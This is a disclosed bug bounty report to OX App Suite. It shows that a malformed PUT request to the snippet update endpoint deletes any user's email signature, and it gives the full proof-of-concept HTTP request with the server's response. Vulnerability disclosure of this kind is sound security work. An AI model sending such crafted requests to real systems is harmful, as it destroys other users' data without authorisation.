@@ -1,0 +1,37 @@
+ReportLink:https://hackerone.com/reports/199321
+WeaknessName:Information Disclosure
+Reporter:https://hackerone.com/inhibitor181
+ReportedTo:OX App Suite(appsuite)
+BountyAmount:300.0
+Severity:
+State:Closed
+DateOfDisclosure:28.09.2017 7:19:45
+
+Summary:
+
+Hello again, I have found that everybody can delete everybody's signature via a malformed PUT request in `/appsuite/api/snippet?action=update`. Although a processing error is thrown, the targeted signature is deleted.
+
+POC
+------------------
+```
+PUT /appsuite/api/snippet?action=update&id=7&session=374be123c3f142ab8a63724bc62042e3 HTTP/1.1
+Host: sandbox.open-xchange.com
+/**/
+
+{"id":"7","misc":{"insertion":"below","content-type":"text/html"},"content":"<p>&nbsp;test24<br></p>","displayname":"test23"}
+```
+
+Response
+
+```
+HTTP/1.1 200 OK
+Server: nginx
+/**.
+
+
+{"error":"An error occurred inside the server which prevented it from fulfilling the request.","error_params":["7"],"categories":"ERROR","category":8,"code":"SNIPPET-0003","error_id":"1561167371-118675","error_desc":"No such snippet found for identifier: 7"}
+```
+
+Video POC attached.
+
+PS : Out of trial reports for now until you resolve 1 or 2 of them, so you probably won't hear from me for some time :)
